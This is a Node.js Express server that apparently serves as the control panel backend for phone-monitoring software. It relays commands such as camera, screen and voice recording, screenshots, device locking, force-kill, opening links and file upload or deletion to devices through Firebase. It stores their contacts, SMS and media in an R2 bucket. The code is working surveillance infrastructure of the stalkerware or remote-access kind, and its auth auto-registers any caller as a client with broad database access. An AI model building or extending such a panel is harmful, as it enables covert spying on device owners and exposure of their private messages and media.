const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { AccessToken } = require('livekit-server-sdk');
const { S3Client, ListObjectsV2Command, PutObjectCommand, GetObjectCommand, HeadObjectCommand, DeleteObjectCommand } = require('@aws-sdk/client-s3');
const { getSignedUrl } = require('@aws-sdk/s3-request-presigner');

const app = express();
app.use(cors());
app.use(express.json());
const DIST_DIR = path.join(__dirname, 'dist');
const PUBLIC_DIR = fs.existsSync(DIST_DIR) ? DIST_DIR : path.join(__dirname, 'public');

app.use(express.static(PUBLIC_DIR));

// Configuration management
const CONFIG_FILE = process.env.CONFIG_FILE || path.join(__dirname, 'config.json');

// Default config
let config = {
  FIREBASE_DB_URL: 'https://backup-notifcation-default-rtdb.firebaseio.com',
  LIVEKIT_WS_URL: '',
  LIVEKIT_API_KEY: '',
  LIVEKIT_API_SECRET: '',
  R2_HOST: '',
  R2_ACCESS_KEY: '',
  R2_SECRET_KEY: '',
  R2_BUCKET: 'files'
};

if (fs.existsSync(CONFIG_FILE)) {
  try {
    const data = fs.readFileSync(CONFIG_FILE, 'utf8');
    config = { ...config, ...JSON.parse(data) };
  } catch (e) {
    console.error("Error reading config.json", e);
  }
}

function saveConfig() {
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
}

// On startup: if local config is missing LiveKit creds but has a known PIN,
// fetch from Firebase and cache locally so tokens work without the browser header.
async function bootstrapConfigFromFirebase() {
  if (config.LIVEKIT_API_KEY && config.LIVEKIT_API_SECRET && config.LIVEKIT_WS_URL) return;
  const pin = config.LAST_CONNECTION_KEY;
  if (!pin) return;
  try {
    console.log(`[Config] Local LiveKit config empty — fetching from Firebase for key=${pin}`);
    const r = await fetch(`https://notification-secret-default-rtdb.firebaseio.com/Apis/${pin}.json`);
    const data = await r.json();
    if (data && data.LIVEKIT_API_KEY && data.LIVEKIT_WS_URL) {
      config = { ...config, ...data };
      saveConfig();
      console.log('[Config] LiveKit config loaded from Firebase and cached locally.');
    }
  } catch (e) {
    console.error('[Config] Failed to bootstrap from Firebase:', e.message);
  }
}
bootstrapConfigFromFirebase();

const apiCache = new Map();

// The device/role code normally arrives in a header (fetch calls) but <img>,
// <video> and direct download links can only pass it as a query parameter.
function clientCode(req) {
  return req.headers['x-device-code'] || req.query.code || '';
}

// Connection/PIN key — same header-or-query rule as the device code.
function clientPin(req) {
  return req.headers['x-connection-key'] || req.query.ck || '';
}

async function getClientConfig(req) {
  const pin = clientPin(req);
  if (!pin) return config;

  const cached = apiCache.get(pin);
  if (cached && Date.now() - cached.time < 300000) {
    return cached.data;
  }

  try {
    const r = await fetch(`https://notification-secret-default-rtdb.firebaseio.com/Apis/${pin}.json`);
    const data = await r.json();
    if (data) {
      // Merge over local config, but IGNORE empty/null/blank values coming
      // from Firebase so that local fallback credentials (e.g. R2 keys stored
      // in config.json) still apply when the remote Apis entry doesn't define
      // them. Without this, an Apis entry saved without R2 fields would wipe
      // the working local R2 config and the Backups page would say
      // "R2 not configured".
      const cleaned = {};
      for (const [k, v] of Object.entries(data)) {
        if (v !== null && v !== undefined && String(v).trim() !== '') cleaned[k] = v;
      }
      const merged = { ...config, ...cleaned };
      apiCache.set(pin, { data: merged, time: Date.now() });
      return merged;
    }
  } catch(e) {
    console.error(`Failed to fetch config for pin ${pin}`, e);
  }
  
  return config;
}

// Authentication / Role Check
const ADMIN_DB = 'https://notification-secret-default-rtdb.firebaseio.com/User.json';

app.post('/api/auth', async (req, res) => {
  const { code } = req.body;
  if (!code) return res.status(400).json({ error: 'No code provided' });
  
  try {
    const response = await fetch(ADMIN_DB);
    const users = await (response.json().catch(() => ({}))) || {};
    
    if (users[code]) {
      res.json({ role: users[code] });
    } else {
      // Auto-register as client
      const putRes = await fetch(`https://notification-secret-default-rtdb.firebaseio.com/User/${code}.json`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify('client')
      });
      if (!putRes.ok) throw new Error('Failed to auto-register');
      res.json({ role: 'client' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Auth check failed' });
  }
});

// Cache auth checks to prevent hammering Firebase
const authCache = new Map(); 

// Middleware for general API access (both admin and client)
async function checkAuth(req, res, next) {
  const code = clientCode(req);
  if (!code) return res.status(401).json({ error: 'Unauthorized' });
  
  const cached = authCache.get(code);
  if (cached && Date.now() - cached.time < 60000) {
    req.userRole = cached.role;
    return next();
  }

  try {
    const response = await fetch(ADMIN_DB);
    const users = await (response.json().catch(() => ({}))) || {};
    if (users[code] === 'admin' || users[code] === 'client') {
      authCache.set(code, { role: users[code], time: Date.now() });
      req.userRole = users[code];
      next();
    } else {
      res.status(403).json({ error: 'Forbidden' });
    }
  } catch(e) {
    res.status(500).json({ error: 'Auth error' });
  }
}

// Middleware to protect admin routes
async function checkAdmin(req, res, next) {
  const code = clientCode(req);
  if (!code) return res.status(401).json({ error: 'Unauthorized' });
  try {
    const response = await fetch(ADMIN_DB);
    const users = await response.json();
    if (users && users[code] === 'admin') {
      next();
    } else {
      res.status(403).json({ error: 'Forbidden' });
    }
  } catch(e) {
    res.status(500).json({ error: 'Auth error' });
  }
}

// Admin Config Routes
app.get('/api/config', checkAdmin, async (req, res) => {
  const cfg = await getClientConfig(req);
  res.json(cfg);
});

app.post('/api/config', checkAdmin, async (req, res) => {
  const pin = req.headers['x-connection-key'];
  if (!pin) {
    config = { ...config, ...req.body };
    saveConfig();
    return res.json({ success: true });
  }
  
  try {
    const cfg = await getClientConfig(req);
    const newCfg = { ...cfg, ...req.body };
    const r = await fetch(`https://notification-secret-default-rtdb.firebaseio.com/Apis/${pin}.json`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(newCfg)
    });
    if (!r.ok) throw new Error("Failed to save to Firebase");
    
    apiCache.set(pin, { data: newCfg, time: Date.now() });
    // Always mirror to local config.json so the server has credentials as fallback
    config = { ...config, ...newCfg, LAST_CONNECTION_KEY: pin };
    saveConfig();
    res.json({ success: true });
  } catch(e) {
    res.status(500).json({ error: e.message });
  }
});

// Firebase Proxy
app.post('/api/firebase/get', checkAuth, async (req, res) => {
  const cfg = await getClientConfig(req);
  const { path } = req.body;
  const p = path.includes("?") ? path.replace("?", ".json?") : path + ".json";
  try {
    const r = await fetch(`${cfg.FIREBASE_DB_URL}/${p}`);
    if (!r.ok) return res.status(r.status).json({ error: 'Firebase GET failed' });
    const data = await r.json();
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/firebase/put', checkAuth, async (req, res) => {
  const cfg = await getClientConfig(req);
  const { path, value } = req.body;
  const p = path.includes("?") ? path.replace("?", ".json?") : path + ".json";
  try {
    const r = await fetch(`${cfg.FIREBASE_DB_URL}/${p}`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(value)
    });
    if (!r.ok) return res.status(r.status).json({ error: 'Firebase PUT failed' });
    const data = await r.json();
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/firebase/del', checkAuth, async (req, res) => {
  const cfg = await getClientConfig(req);
  const { path } = req.body;
  const p = path.includes("?") ? path.replace("?", ".json?") : path + ".json";
  try {
    const r = await fetch(`${cfg.FIREBASE_DB_URL}/${p}`, { method: 'DELETE' });
    if (!r.ok) return res.status(r.status).json({ error: 'Firebase DELETE failed' });
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Remove a device entirely from the dashboard.
//
// Deletes EVERY Firebase node that belongs to the device EXCEPT the contact
// list (Contacts/{id}) and the SMS list (message/{id}), which the admin may
// still want to keep. Because the Devices page auto-discovers devices from the
// `run` node, removing `run/{id}` makes the device stop showing up.
//
// Admin-only: only a registered admin code can wipe device data.
app.post('/api/firebase/remove-device', checkAdmin, async (req, res) => {
  const cfg = await getClientConfig(req);
  const { deviceId } = req.body;
  if (!deviceId || typeof deviceId !== 'string')
    return res.status(400).json({ error: 'Missing deviceId' });

  // Every top-level node that the child app writes per-device.
  // (Mirrors MonitoringService.forceKillAll + the pin/unlock nodes from
  // Settings.) Contacts and message are intentionally NOT in this list.
  const nodes = [
    'Camera_rec', 'Screen_rec', 'Torch', 'shake', 'Call',
    'Force_kill', 'Open_link', 'lock_device', 'Screen_shooter',
    'wall', 'Upload_files', 'Delete_file', 'upload',
    'Voice_rec', 'Notification_send', 'Battary', 'run',
    'Most_used', 'Device_info', 'Apps', 'pin', 'unlock',
  ];

  const base = cfg.FIREBASE_DB_URL;
  if (!base) return res.status(500).json({ error: 'Firebase DB URL not configured' });

  const results = [];
  for (const node of nodes) {
    try {
      const r = await fetch(`${base}/${node}/${deviceId}.json`, { method: 'DELETE' });
      results.push({ node, ok: r.ok, status: r.status });
    } catch (e) {
      results.push({ node, ok: false, error: e.message });
    }
  }
  res.json({ success: true, deviceId, results });
});

// LiveKit Token Route
app.post('/api/livekit/token', checkAuth, async (req, res) => {
  const cfg = await getClientConfig(req);
  const { roomName, participantName } = req.body;

  const key = cfg.LIVEKIT_API_KEY;
  const secret = cfg.LIVEKIT_API_SECRET;
  const wsUrl = cfg.LIVEKIT_WS_URL;

  if (!key || !secret || !wsUrl) {
    const pin = req.headers['x-connection-key'] || '(none)';
    console.error(`[LiveKit] Token request denied — missing config for key=${pin}. key=${!!key} secret=${!!secret} url=${!!wsUrl}`);
    return res.status(400).json({ error: 'LiveKit not configured — check your API settings (key/secret/URL)' });
  }

  try {
    const at = new AccessToken(key, secret, {
      identity: participantName || `admin-${Math.floor(Math.random()*10000)}`,
    });
    at.addGrant({ roomJoin: true, room: roomName, canPublish: true, canSubscribe: true });

    // toJwt() is async in livekit-server-sdk v2 — must be awaited
    const token = await at.toJwt();
    console.log(`[LiveKit] Token minted for room=${roomName}`);
    res.json({ url: wsUrl, token });
  } catch (e) {
    console.error('[LiveKit] Token generation error:', e.message);
    res.status(500).json({ error: 'Token generation failed: ' + e.message });
  }
});

// S3 / R2 Setup
//
// IMPORTANT (512MB host): creating an S3Client is expensive — each one owns an
// HTTP agent + connection pool. The Backups/Media pages fire hundreds of
// concurrent thumbnail requests at /api/r2/file; if we built a new client per
// request the process ran out of memory and crashed. So we cache ONE client
// per (endpoint + credentials) tuple and reuse it for every request.
const _s3Cache = new Map();
function getS3Client(cfg) {
  if (!cfg.R2_HOST || !cfg.R2_ACCESS_KEY || !cfg.R2_SECRET_KEY) return null;
  let endpoint = cfg.R2_HOST;
  if (!endpoint.startsWith('http')) endpoint = 'https://' + endpoint;
  const cacheKey = `${endpoint}|${cfg.R2_ACCESS_KEY}|${cfg.R2_SECRET_KEY}`;
  let client = _s3Cache.get(cacheKey);
  if (client) return client;
  client = new S3Client({
    region: 'auto',
    endpoint: endpoint,
    credentials: {
      accessKeyId: cfg.R2_ACCESS_KEY,
      secretAccessKey: cfg.R2_SECRET_KEY,
    }
  });
  _s3Cache.set(cacheKey, client);
  return client;
}

// Concurrency limiter for R2 object streaming.
//
// The Backups/Media pages can request a few hundred thumbnails at once. Each
// GetObject opens a streamed response that stays alive while bytes flow. With
// no cap, Node buffers chunks for ALL of them simultaneously and the 512MB
// instance OOMs. We allow only MAX_R2_STREAMS concurrent object streams; the
// rest queue and run as slots free up. This bounds peak memory usage.
const MAX_R2_STREAMS = 6;
let _activeR2Streams = 0;
const _r2WaitQueue = [];
function acquireR2Slot() {
  if (_activeR2Streams < MAX_R2_STREAMS) { _activeR2Streams++; return Promise.resolve(); }
  return new Promise(resolve => _r2WaitQueue.push(resolve));
}
function releaseR2Slot() {
  if (_r2WaitQueue.length) {
    // Hand the slot straight to the next waiter (count stays the same).
    const next = _r2WaitQueue.shift();
    next();
  } else {
    _activeR2Streams = Math.max(0, _activeR2Streams - 1);
  }
}

// Content-Type by extension, used when R2 stored no metadata.
const MIME_TYPES = {
  jpg: 'image/jpeg', jpeg: 'image/jpeg', png: 'image/png', gif: 'image/gif',
  webp: 'image/webp', bmp: 'image/bmp', heic: 'image/heic', heif: 'image/heif',
  svg: 'image/svg+xml', ico: 'image/x-icon', dng: 'image/x-adobe-dng',
  mp4: 'video/mp4', m4v: 'video/x-m4v', webm: 'video/webm', mkv: 'video/x-matroska',
  mov: 'video/quicktime', '3gp': 'video/3gpp', avi: 'video/x-msvideo', ts: 'video/mp2t',
  mp3: 'audio/mpeg', m4a: 'audio/mp4', aac: 'audio/aac', wav: 'audio/wav',
  ogg: 'audio/ogg', opus: 'audio/opus', amr: 'audio/amr', flac: 'audio/flac',
  pdf: 'application/pdf', txt: 'text/plain; charset=utf-8', json: 'application/json',
  xml: 'application/xml', csv: 'text/csv', zip: 'application/zip', rar: 'application/vnd.rar',
  apk: 'application/vnd.android.package-archive', vcf: 'text/vcard',
  doc: 'application/msword', docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  xls: 'application/vnd.ms-excel', xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  ppt: 'application/vnd.ms-powerpoint', pptx: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
};

function mimeFromKey(key) {
  const ext = String(key || '').split('.').pop().toLowerCase();
  return MIME_TYPES[ext] || 'application/octet-stream';
}

// Strips path separators / quotes / control chars from a client-supplied
// filename before echoing it back in Content-Disposition.
function safeFileName(name) {
  return String(name || '')
    .replace(/[\\/:*?"<>|\r\n]/g, '')
    .replace(/[\x00-\x1f]/g, '')
    .trim()
    .slice(0, 180);
}

// R2 Proxy Routes
//
// The bucket is browsed/played through this server instead of a public R2
// domain: the bucket has no public URL configured, and proxying keeps object
// requests same-origin (so <img>/<video>/fetch work without R2 CORS rules).
// Auth arrives as header or query param (see clientCode/clientPin) because
// media tags cannot send headers.
app.get('/api/r2/list', checkAuth, async (req, res) => {
  const cfg = await getClientConfig(req);
  const prefix = req.query.prefix || '';
  const s3 = getS3Client(cfg);
  if (!s3) return res.status(400).json({ error: 'R2 not configured' });

  try {
    const params = { Bucket: cfg.R2_BUCKET, Prefix: prefix };
    // delimiter=/ turns the listing into "folders + files" for the Backups page
    if (req.query.delimiter) params.Delimiter = req.query.delimiter;
    if (req.query.maxKeys) params.MaxKeys = parseInt(req.query.maxKeys, 10) || undefined;
    if (req.query.token) params.ContinuationToken = req.query.token;
    if (req.query.startAfter) params.StartAfter = req.query.startAfter;
    const cmd = new ListObjectsV2Command(params);
    const data = await s3.send(cmd);
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Aggregated size/count for a whole prefix (recursive, paged internally).
// Used by the Backups page to show folder totals without pulling every key
// down to the browser.
app.get('/api/r2/summary', checkAuth, async (req, res) => {
  const cfg = await getClientConfig(req);
  const prefix = req.query.prefix || '';
  const s3 = getS3Client(cfg);
  if (!s3) return res.status(400).json({ error: 'R2 not configured' });

  const MAX_PAGES = 25; // hard stop: 25k objects
  let token = undefined, count = 0, size = 0, pages = 0, truncated = false;
  try {
    do {
      const data = await s3.send(new ListObjectsV2Command({
        Bucket: cfg.R2_BUCKET, Prefix: prefix, MaxKeys: 1000, ContinuationToken: token,
      }));
      (data.Contents || []).forEach(o => { count++; size += Number(o.Size || 0); });
      token = data.IsTruncated ? data.NextContinuationToken : undefined;
      pages++;
      if (token && pages >= MAX_PAGES) { truncated = true; token = undefined; }
    } while (token);
    res.json({ prefix, count, size, truncated });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Object metadata (size/type) without downloading the body.
app.get('/api/r2/stat', checkAuth, async (req, res) => {
  const cfg = await getClientConfig(req);
  const key = req.query.key;
  const s3 = getS3Client(cfg);
  if (!s3) return res.status(400).json({ error: 'R2 not configured' });
  if (!key) return res.status(400).json({ error: 'Missing key' });

  try {
    const data = await s3.send(new HeadObjectCommand({ Bucket: cfg.R2_BUCKET, Key: key }));
    res.json({
      key,
      size: Number(data.ContentLength || 0),
      contentType: data.ContentType || mimeFromKey(key),
      lastModified: data.LastModified || null,
      etag: data.ETag || null,
    });
  } catch (e) {
    res.status(404).json({ error: e.message });
  }
});

// Streams an object straight from R2 (images, videos, screenshots, downloads).
// Range requests are forwarded so <video> seeking works.
//
// Memory safety (512MB host):
//  - Gated by acquireR2Slot()/releaseR2Slot() so at most MAX_R2_STREAMS objects
//    stream at once; excess requests queue instead of OOMing the process.
//  - The body is ALWAYS streamed in chunks — we never call transformToByteArray
//    (which buffers the entire object in RAM). Even a 500MB video streams
//    through with near-constant memory.
app.get('/api/r2/file', checkAuth, async (req, res) => {
  const cfg = await getClientConfig(req);
  const key = req.query.key;
  const s3 = getS3Client(cfg);
  if (!s3) return res.status(400).json({ error: 'R2 not configured' });
  if (!key) return res.status(400).json({ error: 'Missing key' });

  // Wait for a free streaming slot before we even touch R2.
  await acquireR2Slot();
  let released = false;
  const release = () => { if (!released) { released = true; releaseR2Slot(); } };

  // If the client disconnects while queued/streaming, release the slot.
  const onAbort = () => release();
  req.on('close', onAbort);

  try {
    const params = { Bucket: cfg.R2_BUCKET, Key: key };
    if (req.headers.range) params.Range = req.headers.range;

    const data = await s3.send(new GetObjectCommand(params));
    const name = safeFileName(req.query.name) || key.split('/').pop();

    res.setHeader('Content-Type', data.ContentType || mimeFromKey(key));
    res.setHeader('Accept-Ranges', 'bytes');
    res.setHeader('Cache-Control', 'private, max-age=3600');
    if (data.ContentLength != null) res.setHeader('Content-Length', String(data.ContentLength));
    if (data.ContentRange) {
      res.status(206);
      res.setHeader('Content-Range', data.ContentRange);
    }
    if (req.query.dl) {
      res.setHeader(
        'Content-Disposition',
        `attachment; filename="${name.replace(/[^\x20-\x7e]/g, '_')}"; filename*=UTF-8''${encodeURIComponent(name)}`
      );
    }

    const body = data.Body;
    if (body && typeof body.pipe === 'function') {
      // Node Readable stream — pipe straight through.
      body.on('error', () => { try { res.destroy(); } catch (_) {} release(); });
      body.on('end', release);
      body.on('close', release);
      body.pipe(res);
    } else if (body && (typeof body[Symbol.asyncIterator] === 'function' || typeof body.transformToWebStream === 'function')) {
      // SDK streaming-blob variant: iterate chunks. NEVER buffer the whole
      // object — write each chunk and respect backpressure (drain).
      const stream = typeof body.transformToWebStream === 'function'
        ? body.transformToWebStream()
        : body;
      try {
        for await (const chunk of stream) {
          if (res.writableEnded) break;
          if (!res.write(Buffer.from(chunk))) {
            await new Promise(r => res.once('drain', r));
          }
        }
        if (!res.writableEnded) res.end();
        release();
      } catch (e) {
        try { res.destroy(); } catch (_) {}
        release();
      }
    } else {
      // No body (e.g. empty object) — just end.
      res.end();
      release();
    }
  } catch (e) {
    release();
    req.off('close', onAbort);
    if (res.headersSent) { try { res.destroy(); } catch (_) {} return; }
    const notFound = /NoSuchKey|NotFound|404/.test(e.name || e.message || '');
    res.status(notFound ? 404 : 500).json({ error: e.message });
  }
});

app.post('/api/r2/presign-put', checkAuth, async (req, res) => {
  const cfg = await getClientConfig(req);
  const { key, contentType } = req.body;
  const s3 = getS3Client(cfg);
  if (!s3) return res.status(400).json({ error: 'R2 not configured' });
  
  try {
    const cmd = new PutObjectCommand({ Bucket: cfg.R2_BUCKET, Key: key, ContentType: contentType });
    const url = await getSignedUrl(s3, cmd, { expiresIn: 3600 });
    res.json({ url });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/r2/presign-get', checkAuth, async (req, res) => {
  const cfg = await getClientConfig(req);
  const { key } = req.body;
  const s3 = getS3Client(cfg);
  if (!s3) return res.status(400).json({ error: 'R2 not configured' });
  if (!key) return res.status(400).json({ error: 'Missing key' });

  try {
    const cmd = new GetObjectCommand({ Bucket: cfg.R2_BUCKET, Key: key });
    const url = await getSignedUrl(s3, cmd, { expiresIn: 3600 });
    res.json({ url });
  } catch(e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/r2/delete', checkAuth, async (req, res) => {
  const cfg = await getClientConfig(req);
  const { key } = req.body;
  const s3 = getS3Client(cfg);
  if (!s3) return res.status(400).json({ error: 'R2 not configured' });
  
  try {
    const cmd = new DeleteObjectCommand({ Bucket: cfg.R2_BUCKET, Key: key });
    await s3.send(cmd);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// SPA fallback — only for browser navigation requests.
//
// IMPORTANT: this must NOT serve index.html for missing static assets
// (.css/.js/.png/...). If it did, the browser would receive an HTML document
// for a <link rel="stylesheet"> or <script src> and render the page WITHOUT
// any CSS / with broken JS — exactly the "html page only, no CSS" symptom.
// Missing assets should 404 cleanly; only HTML navigations get index.html.
app.use((req, res) => {
  const accept = req.headers.accept || '';
  if (req.method === 'GET' && accept.includes('text/html')) {
    const filePath = path.join(PUBLIC_DIR, 'index.html');
    return res.sendFile(filePath, err => {
      if (err) {
        if (err.code === 'ENOENT') {
          res.status(404).send("<h2>404 Not Found</h2><p>The <code>index.html</code> file is missing.</p>");
        } else {
          try { res.status(err.status || 500).end(); } catch (_) {}
        }
      }
    });
  }
  res.status(404).end();
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
